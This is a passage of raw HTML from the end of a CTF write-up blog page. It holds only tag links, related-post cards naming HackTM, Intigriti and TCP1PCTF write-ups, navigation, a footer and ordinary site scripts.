href="/tags/pwnable-kr/">pwnable.kr</a> <a class="post-tag" href="/tags/intigriti/">intigriti</a> <a class="post-tag" href="/tags/osep/">osep</a> <a class="post-tag" href="/tags/oswe/">oswe</a> <a class="post-tag" href="/tags/webs/">Webs</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/HackTM-CTF-2023-Writeup/"><div class="card-body"> <em class="small" data-ts="1676764800" data-df="ll" > Feb 19, 2023 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTM CTF 2023 - Writeup</h3><div class="text-muted small"><p> This write-up serves as a personal reference and a tool for me to practice CTF. It includes information and solutions collected from various sources, including challenges that were not solved durin...</p></div></div></a></div><div class="card"> <a href="/posts/Intigriti-Challenge-1021-Writeup/"><div class="card-body"> <em class="small" data-ts="1685664000" data-df="ll" > Jun 2, 2023 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Intigriti - Challenge 1021 Writeup</h3><div class="text-muted small"><p> This is my first attempt at the intigriti challenge. I’m writing this to learn and share my experience with others. I’ve included information from various sources to provide a comprehensive overvie...</p></div></div></a></div><div class="card"> <a href="/posts/TCP1PCTF-2023-Web-Unsecure/"><div class="card-body"> <em class="small" data-ts="1697500800" data-df="ll" > Oct 17, 2023 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>TCP1PCTF 2023 - Un Secure [WEB]</h3><div class="text-muted small"><p> Link to archive challenges: https://github.com/TCP1P/TCP1P-CTF-2023-Challenges/tree/main/Web/Un%20Secure Category : Web Web : Un Secure We received a zip file dist.zip with the source c...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/FlareOn-02-2015-Challenge-2/" class="btn btn-outline-primary" prompt="Older"><p>FlareOn2 2015 - Challenge 2</p></a> <a href="/posts/Intigriti-Challenge-1021-Writeup/" class="btn btn-outline-primary" prompt="Newer"><p>Intigriti - Challenge 1021 Writeup</p></a></div></div></div><footer class="row pl-3 pr-3"><div class="col-12 d-flex justify-content-between align-items-center text-muted pl-0 pr-0"><div class="footer-left"><p class="mb-0"> © 2024 <a href="https://twitter.com/h0j3n">H0j3n</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/writeup/">writeup</a> <a class="post-tag" href="/tags/certification/">certification</a> <a class="post-tag" href="/tags/flareon/">flareon</a> <a class="post-tag" href="/tags/pwn/">Pwn</a> <a class="post-tag" href="/tags/pwnable-kr/">pwnable.kr</a> <a class="post-tag" href="/tags/intigriti/">intigriti</a> <a class="post-tag" href="/tags/osep/">osep</a> <a class="post-tag" href="/tags/oswe/">oswe</a> <a class="post-tag" href="/tags/webs/">Webs</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a><div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-animation="true" data-autohide="false"><div class="toast-header"> <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close"> <span aria-hidden="true">&times;</span> </button></div><div class="toast-body text-center pt-0"><p class="pl-2 pr-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></div><script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
